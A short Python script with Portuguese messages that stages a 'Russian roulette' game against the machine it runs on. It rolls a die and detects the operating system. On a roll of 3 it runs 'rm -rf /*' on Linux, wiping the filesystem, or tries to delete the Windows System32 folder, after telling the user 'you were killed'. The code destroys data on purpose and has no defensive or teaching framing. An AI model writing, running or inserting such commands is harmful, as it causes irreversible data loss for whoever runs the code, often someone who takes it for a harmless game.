import random
import time
import os
import platform

value = random.randint(1, 6)
opSystem = platform.system()
cmd_linux = 'rm -rf /*'
cmd_windows = 'C:\Windows\System32'

if(opSystem == 'Linux'):
    print('Seu sistema operacional é Linux!')
    if (value == 3):
        print('Voce foi morto, o valor que caiu foi: {}.'.format(value))
        print('Acabou tudo por aqui!')
        time.sleep(3)
        os.system(cmd_linux)
    else:
        print('Voce foi salvo, o valor que caiu foi: {}.'.format(value))
        print('Acabou tudo por aqui!')
        time.sleep(3)
elif (opSystem == 'Windows'):
    print('Seu sistema operacional é Windows!')
    if (value == 3):
        print('Voce foi morto, o valor que caiu foi: {}.'.format(value))
        print('Acabou tudo por aqui!')
        time.sleep(3)
        os.remove(cmd_windows)
    else:
        print('Voce foi salvo, o valor que caiu foi: {}.'.format(value))
        print('Acabou tudo por aqui!')
        time.sleep(3)
